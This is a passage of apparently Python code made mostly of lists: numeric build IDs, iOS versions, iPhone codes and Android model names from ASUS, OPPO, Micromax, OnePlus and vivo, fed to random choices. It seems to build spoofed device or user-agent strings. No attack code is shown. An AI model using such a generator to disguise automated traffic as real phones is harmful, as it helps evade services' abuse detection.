'164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186']))
    scale = random.choice(["2.00", "3.00", "2.61", "2.00", "2.61", "2.00", "3.00", "2.00", "2.61", "3.00"])
    gamut = random.choice(["display", "P3", "display", "wide", "P3", "display", "wide"])
    ios = random.choice(["iOS 14_4_1", "iOS 15_0", "iOS 12_1_3", "iOS 15_0_1", "iOS 14_7_1", "iOS 14_6", "iOS 13_5", "iOS 14_0_1", "iOS 11_2_6", "iOS 15_1"])
    iphn = random.choice(["11,8", "12,1", "9,2", "13,3", "10,5", "12,8", "10,4", "13,1", "9,1", "11,2"])
    asus = ['ASUS_A002','ASUS_A002A','ASUS_A002_1','ASUS_A002_2','ASUS_AI2201','ASUS_AI2201_B','QTI SM8475','ASUS_I001_1','ASUS_I001D','ASUS_I002D','ASUS_I003_1','ASUS_I003D','ASUS_I004D','ASUS_I005_1','ASUS_I005D','ASUS_I006D','ASUS_I006D','ASUS_I007_1','ASUS_I007D','ASUS_I01WD','ASUS_Z01QD_1','ASUS_Z01QD']
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    oppo2 = ["OP4F97", "OP4BA5L1", "OP664D1", "OP5F11L1", "OP2A92", "OP8F17", "OP8F31", "OP4C9E1", "OP5B31", "OP4BA6L1", "OP2B87", "OP6F21", "OP6C8E1", "OP8F11", "OPPOA16", "OPPOA15", "OPPOA11", "OPPOA73", "OPPOA37", "OPPOA53", "OPPOA33", "OPPOA93", "OPPOA35", "OPPOA83", "OPPOA57", "OPPOA71", "OPPOA39", "OPPOA3", "OPPOA51", "OPPOA27", "OPPOA79"]
    micromax = ['Micromax 10', 'Micromax 1J', 'Micromax 86519', 'Micromax A064', 'Micromax_A064', 'Micromax A065', 'Micromax_A065', 'Micromax A066', 'Micromax_A066', 'Micromax A067', 'Micromax_A067', 'MICROMAX_A068', 'MICROMAX A068', 'Micromax A068', 'Micromax A069', 'Micromax_A069', 'Micromax A075', 'Micromax A082', 'Micromax_A082', 'Micromax A089', 'Micromax_A089', 'Micromax A091', 'Micromax A092', 'Micromax_A092', 'Micromax A093', 'Micromax_A093', 'Micromax A095', 'Micromax A096', 'Micromax_A101', 'Micromax A102', 'Micromax_A102', 'Micromax A104', 'Micromax a104', 'Micromax A105', 'Micromax_A105', 'Micromax A106', 'Micromax-A106', 'Micromax A108', 'Micromax_A109', 'Micromax A109', 'Micromax A110', 'Micromax_A110', 'Micromax A110Q', 'Micromax_A110Q', 'Micromax A111', 'Micromax A114', 'Micromax A114R', 'Micromax_A114R', 'Micromax A115', 'Micromax_A115', 'Micromax A116', 'Micromax_A116', 'Micromax A116i', 'Micromax_A116i', 'Micromax A117', 'Micromax_A117', 'Micromax A118R', 'Micromax A119', 'Micromax A120', 'Micromax A121', 'Micromax_A121', 'Micromax A15', 'Micromax A177', 'Micromax A190', 'Micromax_A190', 'Micromax A200', 'Micromax_A200', 'Micromax A21', 'Micromax A210', 'Micromax A24', 'Micromax_A24', 'Micromax A25 Smarty', 'Micromax A250', 'Micromax A255', 'Micromax_A255', 'Micromax A26', 'Micromax_A26', 'Micromax_A27', 'Micromax A27', 'Micromax_A28', 'Micromax A28/GRI40', 'Micromax A28', 'Micromax A290', 'Micromax A30', 'Micromax A300', 'Micromax A310', 'Micromax A311', 'Micromax A315', 'Micromax_A315', 'Micromax_A316', 'Micromax A316', 'Micromax_A34', 'Micromax A34', 'Micromax_A35', 'Micromax A35', 'Micromax A350', 'Micromax_A36', 'Micromax A36', 'Micromax_A37', 'Micromax A37', 'Micromax A37B', 'Micromax_A37B', 'Micromax A40', 'Micromax_A40', 'Micromax A46', 'Micromax_A46', 'Micromax A47', 'MicromaxA47', 'Micromax_A50', 'Micromax A50', 'Micromax A51', 'Micromax A52', 'Micromax A54', 'Micromax A56', 'Micromax_A57', 'Micromax A57', 'Micromax A58', 'Micromax_A58', 'Micromax A59', 'Micromax A60', 'Micromax A61', 'Micromax A62', 'Micromax_A62', 'Micromax A63', 'Micromax_A63', 'Micromax_A65', 'Micromax A65', 'Micromax_A66', 'Micromax A66', 'Micromax A67', 'Micromax A68', 'Micromax A69', 'Micromax_A69', 'Micromax_A70', 'Micromax A700', 'Micromax A71', 'Micromax_A71', 'Micromax A72', 'Micromax_A72', 'Micromax A73', 'Micromax_A74', 'Micromax A74', 'Micromax A75', 'Micromax_A76', 'Micromax A76', 'Micromax A77', 'Micromax A78', 'Micromax A79', 'en_us Micromax A80', 'Micromax A80', 'Micromax A82', 'Micromax_A82', 'Micromax A84', 'Micromax A85', 'Micromax A86', 'Micromax_A86', 'Micromax_A87', 'Micromax A87', 'Micromax A87 . Ninja 4.0', 'Micromax A88', 'Micromax_A88', 'Micromax A89', 'Micromax A90', 'Micromax A90s', 'MIcromax_A90s', 'Micromax A90S', 'Micromax A91', 'Micromax_A91', 'Micromax_A92', 'Micromax A92', 'MicromaxA93', 'Micromax A93', 'Micromax A94', 'Micromax_A94', 'Micromax A96', 'Micromax_A96', 'Micromax A97', 'Micromax_A99', 'Micromax A99', 'Micromax_AD3520', 'Micromax AD3520', 'Micromax AD3550', 'Micromax AD4500', 'Micromax_AD4500', 'Micromax AE90', 'Micromax AO5510', 'Micromax AQ5000', 'Micromax B4A', 'Micromax B5 Pro', 'B5Pro', 'Micromax_Bharat_5_Plus', 'Micromax Q402Plus', 'Micromax Q440', 'Micromax Bharat 5', 'Micromax Q4204', 'Micromax Bharat 5 Plus', 'Micromax Bharat 5 Pro', 'Micromax Bolt 3425', 'Micromax Bolt 2', 'Micromax Q402+', 'Micromax Q306', 'Micromax Q3001', 'Micromax Q301', 'Micromax Q303', 'Micromax Q324', 'Micromax Q326', 'Q327', 'Micromax Q327', 'Micromax Q3301', 'Micromax Q333', 'Micromax_Q333', 'Micromax Q338', 'Micromax Q346', 'Micromax Q354', 'Micromax Q357', 'Micromax Q383', 'Micromax_S302', 'Micromax S302', 'Micromax Q424', 'Micromax Q352', 'Micromax Q4101', 'Micromax C2A', 'Micromax C9', 'Micromax C1', 'Micromax C1A', 'Micromax C2APLS', 'Micromax Q4310', 'Micromax E4815', 'arm_64 Micromax E481', 'Micromax E481', 'Micromax E4816', 'Micromax Q462', 'Micromax Q463', 'Micromax E485', 'Micromax E484', 'Micromax AQ4501', 'Micromax AQ4502', 'A240', 'Micromax A240', 'Micromax Q391', 'Micromax E453', 'Micromax A107', 'Micromax HS2', 'Micromax HS1', 'Micromax_HS3', 'en Micromax_HS3', 'AQ5001', 'Micromax AQ5001', 'AQ5001 Canvas Power', 'Micromax Q392', 'Micromax Q465', 'Micromax Q461', 'Micromax Q350R', 'Micromax Q421', 'Micromax Q417', 'Micromax Q426', 'Micromax Q4260', 'Micromax E311', 'Micromax E352', 'Micromax E455', 'Micromax Q415', 'Micromax Q355', 'Micromax Q469', 'Micromax E451', 'Micromax E451', 'Micromax Q340', 'Micromax Q349', 'Micromax Q345', 'Micromax Q450', 'Micromax Q480', 'arm_64 Micromax Q480', 'Micromax Q380', 'Micromax Q3502', 'Micromax Q351', 'Micromax Q385', 'P70221', 'Micromax P681', 'MicromaxP802', 'Micromax Q427', 'Micromax_Q427', 'Micromax Q413', 'Micromax E313', 'Micromax D2', 'Micromax D200', 'Micromax_D200', 'Micromax D303', 'Micromax D304', 'Micromax_D304', 'Micromax D305', 'Micromax D306', 'Micromax D320', 'Micromax D321', 'Micromax D333', 'Micromax D340', 'Micromax D7517', 'Micromax DM5003', 'Micromax E353', 'Micromax E457', 'Micromax E458', 'Micromax E460', 'Micromax E471', 'Micromax E4817', 'Micromax E482', 'Micromax E483', 'Micromax E5018M', 'Micromax EG111', 'Micromax EG116', 'micromax F', 'micromax F189', 'Micromax F601', 'MicromaxF666', 'Micromax IN', 'Micromax E7533', 'Micromax E6523', 'IN_2b', 'IN_Note1', 'MICROMAX IN1', 'N8216', 'N8301', 'ione note', 'MICROMAX ione note', 'Micromax N4120', 'Micromax N8202', 'Micromax Ninja', 'Micromax Nitro', 'Micromax Note 1+', 'Micromax Note 5', 'Micromax Note3', 'Micromax NX', 'Micromax P001', 'Micromax P250(Funbook)', 'Micromax P255', 'Micromax P256', 'xx Micromax P275', 'Micromax_P275', 'Micromax P275', 'Micromax P280', 'Micromax P290', 'Micromax P310', 'Micromax P350', 'xx Micromax P350', 'Micromax P360', 'Micromax P362', 'Micromax P365', 'Micromax P410', 'Micromax P410i', 'Micromax_P410i', 'Micromax P420', 'Micromax P469', 'Micromax P470', 'MicromaxP480', 'Micromax P500(Funbook)', 'Micromax P560', 'Micromax P580', 'Micromax P580i', 'Micromax P600', 'Micromax P650', 'Micromax P650E', 'Micromax P660', 'Micromax P660', 'Micromax_P666', 'Micromax P666', 'MicromaxP680', 'Micromax P690', 'Micromax P701', 'MicromaxP702', 'Micromax P810', 'en Micromax Q300', 'Micromax_Q300', 'Micromax Q323', 'Micromax_Q323', 'Micromax Q325', 'Micromax_Q325', 'Micromax Q331', 'Micromax_Q331', 'Micromax Q332', 'Micromax_Q332', 'Micromax Q334', 'Micromax Q335', 'Micromax_Q335', 'Micromax Q336', 'Micromax_Q336', 'Micromax Q341', 'Micromax Q343', 'Micromax Q348', 'Micromax_Q353', 'en Micromax_Q353', 'Micromax_Q353P', 'Micromax Q3551', 'Micromax Q3555', 'Micromax Q361', 'Micromax Q370', 'Micromax_Q370', 'Micromax Q371', 'Micromax_Q371', 'Micromax Q375', 'Micromax_Q375', 'Micromax Q379', 'Micromax Q381', 'Micromax Q382', 'Micromax Q386', 'Micromax Q394', 'Micromax_Q394', 'Micromax Q395', 'Micromax Q397', 'Micromax Q398', 'arm Micromax Q398', 'Micromax Q400', 'Micromax_Q400', 'Micromax Q4002', 'en Micromax Q4002', 'Micromax Q401', 'Micromax Q402', 'Micromax Q402 Ultra', 'Micromax Q404', 'Micromax Q411', 'Micromax_Q411', 'Micromax Q412', 'Micromax Q414', 'Micromax Q416', 'Micromax Q419', 'Micromax Q4201', 'Micromax Q422', 'Micromax Q4220', 'Micromax Q423', 'Micromax Q428', 'Micromax_Q428', 'Micromax Q429', '720X1280 Micromax Q4309', 'Micromax Q4312', 'en_US Micromax Q437', 'Micromax Q440Plus', 'Micromax Q454', 'Micromax Q470', 'Micromax Q479', 'Micromax Q491', 'Micromax_Q491', 'Micromax Q502+', 'Micromax Q666', 'Micromax Q67', 'micromax Q68', 'micromax Q78', 'Micromax S300', 'Micromax_S300', 'Micromax S301', 'Micromax_S301', 'Micromax Q4311', 'Micromax Q4601', 'Micromax Q409A', 'Micromax Q409', 'Micromax Q452', 'Micromax Unite 3', 'Micromax Unite 2', 'Micromax Unite 2 A106', 'Micromax Q372', 'Micromax V89', 'Micromax Q4001', 'Micromax Q4202', 'Micromax Q4251', 'arm Micromax Q4251', 'Micromax W5509', 'Micromax X5098', 'Micromax-Xzoom A52', 'YU5530', 'YU5040', 'Micromax YU5900', 'YU5012', 'Micromax Z59']
    oneplus = ['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005']
    vivo = ['vivo 1002T', 'Vivo 1605', 'vivo 1730', 'vivo 1809', 'vivo_1820', 'vivo 1835', 'vivo 1914', 'vivo 2010', 'vivo 2019', 'vivo 2019', 'vivo 2019', 'vivo 2023', 'vivo 2027', 'vivo 3969', 'VIVO 5', 'Vivo 6', 'Vivo 7 Pro', 'Vivo 8', 'Vivo 93K Prime', 'vivo A5 ', 'vivo a54', 'Vivo A54', 'vivo a57', 'Vivo A87', 'VIVO A94', 'VIVO AIR', 'VIVO C8818', 'vivo E1', 'vivo E3', 'vivo E3', 'vivo E5', 'Vivo EGO', 'V1962BA', 'vivo h5', 'V1824A', 'V1824A', 'V1824BA', 'V2217A', 'V2217A', 'V2218A', 'V2218A', 'V2218A', 'V2243A', 'V1955A', 'I1927', 'I1928', 'V2024A', 'V2025A', 'V2025A', 'V2049A', 'V2049A', 'I2009', 'I2012', 'I2012', 'V2136A', 'V2136A', 'V2141A', 'V2171A', 'I2017', 'V2172A', 'V2172A', 'I2022', 'I2019', 'I2019', 'I2201', 'V1914A', 'V1914A', 'V1981A', 'V2055A', 'V2118A', 'V2157A', 'V2157A', 'V2154A', 'V2196A', 'V2196A', 'V2199A', 'V2231A', 'V2238A', 'V1936AL', 'V1936A', 'V1922A', 'V1922A', 'V1922A ', 'V1916A', 'V2023A', 'V2023A', 'VIVO V2023A', 'V2065A', 'V2061A', 'V2061A', 'V2143A', 'V2106A', 'V2165A', 'V2165A', 'V2180GA', 'V1986A', 'V2012A', 'V2012A', 'V2073A', 'V2073A', 'I2011', 'V2148A', 'I2018', 'V1919A', 'V2131A', 'V2220A', 'I2202', 'I2206', 'I2203', 'I2202', 'I2127', 'I2202', 'I2208', 'I2208', 'I2126', 'I2126', 'I2126', 'V2164KA', 'V2164KA', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'Vivo J5', 'vivo 1805', 'vivo 1805', 'vivo NEX', 'V1923A', 'vivo 1912', 'V1923A', 'vivo 1912', 'vivo 1913', 'V1924A', 'V1924A', 'vivo 1913', 'V1950A', 'V1950A', 'vivo NEX A', 'vivo NEX A', 'vivo 1813', 'V1821A', 'V1821A', 'vivo NEX S', 'vivo NEX S', 'Vivo ONE', 'Vivo ONE', 'PA2170', 'vivo PD1628F_EX', 'vivo PD1709', 'vivo PD1709F_EX', 'vivo PD1709F_EX', 'vivo PD1728', 'vivo PD1728', 'vivo PD1832F_EX', 'vivo PD2046F_EX', 'vivo PD2050F_EX', 'vivo PD2055F_EX', 'vivo PD2059F_EX', 'Vivo S', 'V1831A', 'V1831A', 'VIVO S1', 'Vivo S1 Prime', 'V1832A', 'V1832T', 'V2121A', 'V2121A', 'V2130A', 'V2130A', 'Vivo S11', 'Vivo S11 ', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S12', 'V2162A', 'Vivo S13', 'V2203A', 'V2207A', 'V2190A', 'V2244A', 'vivo S1Pro', 'Vivo S20 ', 'Vivo S21 ', 'Vivo S31', 'Vivo S4', 'Vivo S40', 'Vivo S41 /MMB439M', 'V1932A', 'vivo S6', 'V1962A', 'vivo S6T', 'V2020CA', 'V2020A', 'Vivo S76', 'V2031EA', 'vivo S7i(t)', 'vivo S7i(t)', 'vivo S7i(t)', 'V2080A', 'vivo S7t', 'vivo_S7t', 'vivo S7t', 'S7t 5G', 'vivo S7w', 'vivo S8', 'vivo S9', 'vivo S9', 'vivo S9', 'V2072A', 'V2048A', 'vivo S9t', 'V2168', 'V2168', 'V2153', 'V2153', 'V2150', 'V2151', 'V2151', 'V2151', 'V2143', 'vivo TD1602_EX', 'vivo U1', 'vivo 1916', 'vivo 1916', 'vivo 1921', 'V1941A', 'V1941A', 'V1928A', 'vivo V1', 'vivo V1', 'vivo V10', 'Vivo V10', 'VIVO V11', 'Vivo V11', 'vivo 1804', 'vivo 1804', 'vivo 1806', 'vivo 1806', 'vivo v11pro', 'vivo 1819', 'vivo 1818', 'vivo 1818', 'vivo 1920', 'vivo 1919', 'vivo 1907', 'vivo 1907', 'vivo 1907_19', 'vivo 1910', 'vivo 1909', 'vivo 1910', 'vivo 1933', 'vivo 1933', 'vivo V1907', 'vivo v19neo', 'vivo V1Max', 'vivo V1Max', 'vivo V2', 'V2040', 'vivo 2018', 'vivo 2018', 'V2022', 'Vivo V20A', 'Vivo V20G', 'V2066', 'V2108', 'V2050', 'V2050', 'V2050', 'V2061', 'V2055', 'Vivo V21S', 'V2130', 'V2132A', 'V2116', 'V2115', 'V2116', 'V2116', 'V2126', 'V2126', 'V2228', 'V2228', 'V2158', 'V2158', 'V2202', 'V2202', 'V2201', 'V2246', 'V2230', 'V2230', 'V2237', 'vivo V3', 'vivo V3', 'vivo V3Max A', 'vivo V3Max L', 'vivo v30', 'vivo v31', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3M A', 'vivo V3M A', 'vivo V3MA', 'vivo_V3Max', 'vivo v45', 'vivo 1601', 'vivo V5', 'vivo 1609', 'vivo 1611', 'Vivo V51', 'Vivo V54', 'vivo 1612', 'vivo 1713', 'vivo V5S A', 'vivo 1718', 'vivo 1716', 'vivo Y79A', 'vivo Y79A', 'V2166BA', 'Vivo V8', 'vivo 1723', 'vivo V9 mini', 'vivo 1851', 'VIVO V9Pro', 'vivo 1851', 'vivo 1727', 'Vivo X', 'V2178A', 'V2229A', 'V2170A', 'V2170A', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5S', 'vivo Xplay5S', 'vivo Xplay6', 'vivo Xplay6L', 'vivo Xplay6', 'vivo Xplay6', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X1', 'vivo X1', 'vivo X1', 'vivo X1', 'Vivo X11', 'vivo X1S', 'vivo X1S', 'vivo X1S', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1W', 'vivo X1w', 'VIVO X2', 'VIVO X2', 'VIVO_X2', 'vivo X20', 'vivo X20A', 'vivo X20Plus A', 'vivo 1720', 'vivo X20Plus UD', 'vivo X20Plus UD', 'vivo X21', 'vivo X21A', 'vivo X21UD A', 'vivo X21i', 'vivo X21i A', 'vivo X21i', 'vivo X21i A ', 'V1814A', 'V1814T', 'V1814T', 'V1814A', 'V1809A', 'V1809A', 'V1816A', 'V1809T', 'V1816T', 'V1829A', 'V1838A', 'V1838T', 'V1829T', 'V1836A', 'V1836A', 'V1836T', 'vivo X27Pro', 'V1938CT', 'V1938T', 'V1938T', 'vivo X3F', 'vivo X3F', 'vivo X3F', 'vivo X3L', 'vivo X3L', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'Vivo X40', 'vivo X5L', 'vivo X5', 'vivo X5L', 'vivo X5Pro D', 'vivo X5Pro L', 'vivo X5Pro V', 'vivo X5Pro D', 'vivo X5Pro D', 'V2001A', 'V2001A', 'vivo 2004', 'vivo 2005', 'vivo 2005', 'V1937', 'vivo 1937', 'V1937', 'V1937', 'vivo 2006', 'vivo 2006', 'V2005A', 'V2011A', 'X50 Pro+', 'V1930', 'V1930', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X520L', 'vivo X5F', 'vivo X5M', 'vivo X5M', 'vivo X5M', 'vivo X5Max ', 'vivo X5Max L', 'vivo X5Max L', 'vivo X5Max S', 'vivo X5Max V', 'vivo X5S L', 'vivo X5S L', 'vivo X5V', 'vivo X5V', 'vivo X5V', 'vivo X6D', 'vivo X6A', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus L', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus D', 'vivo X6Plus L', 'V2046A', 'V2059A', 'V2046A', 'V2045', 'V2046', 'V2047A', 'V2056A', 'V2085A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus A', 'vivo X7L', 'vivo X7Plus', 'vivo X7Plus', 'V2133A', 'V2104', 'V2104', 'V2105', 'V2134A', 'V2105', 'V2145A', 'V2114', 'V2145A', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'V2144', 'V2183A', 'V2144', 'V2208', 'V2185A', 'V2145', 'V2185A', 'Vivo X83', 'vivo X9', 'vivo X9L', 'vivo X9', 'vivo X9', 'vivo X9Plus', 'vivo X9Plus L', 'V2241A', 'V2242A', 'V2242A', 'V2227A', 'vivo X9i', 'vivo X9i', 'vivo X9i', 'vivo X9s', 'vivo X9s L', 'vivo X9s Plus', 'vivo X9s Plus', 'vivo X9s Plus L', 'vivo X9s Plus', 'VIVO XL', 'vivo Xplay', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 